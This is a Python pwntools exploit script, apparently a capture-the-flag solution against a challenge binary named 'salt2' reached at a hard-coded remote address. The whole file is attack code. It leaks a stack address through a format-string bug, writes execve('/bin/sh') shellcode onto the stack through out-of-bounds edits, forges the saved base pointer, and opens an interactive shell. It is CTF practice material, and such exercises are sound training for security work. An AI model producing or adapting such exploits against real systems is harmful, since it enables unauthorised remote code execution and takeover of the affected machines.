#!/usr/bin/python3
from pwn import *
import sys

REMOTE = True
NAME = "salt2"
proc = None
variation = 0
if REMOTE:
    variation = 4
    proc = remote("3.214.74.251", 5678)
else:
    proc = process(f"./{NAME}")

if len(sys.argv) > 1:
    variation = int(sys.argv[1])

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x90"

def choose(choice):
    proc.sendline(b"2")
    proc.sendline(str(choice).encode())

def edit(num, choice):
    proc.sendline(b"4")
    proc.sendline(str(num).encode())
    proc.sendline(str(choice).encode())

def feedback():
    proc.sendline(b"5")
    proc.sendline(b"G%p")
    proc.recvuntil(b"You're feedback is: ")
    return int(proc.recvline().rstrip(b"\n").split(b"0x")[1].decode(), 16)

# Leak stack address using format string
stack_leak = feedback()
print(f"Stack pointer {hex(stack_leak)}")
target = stack_leak + 256 + 64 + (8 * variation)
target_offset = 0x2570
print(f"Target at {hex(target)}")
leap = target - 256
leap_offset = target_offset + 256
print(f"Leap at {hex(leap)}")
# Choose a costume to edit
choose(0)
# Write shellcode
for i in range(0, len(shellcode), 4):
    edit((i-target_offset)//4, u32(shellcode[i:i+4]))
# Write fake rbp
edit(-(leap_offset//4), target & 0xffffffff)
edit(-(leap_offset//4)+1, target >> 32)
# Write LSB of saved rbp
edit(-4, (leap-8) & 0xffffffff)
# Quit the program and get a shell
proc.sendline(b"7")
proc.interactive()
# niftic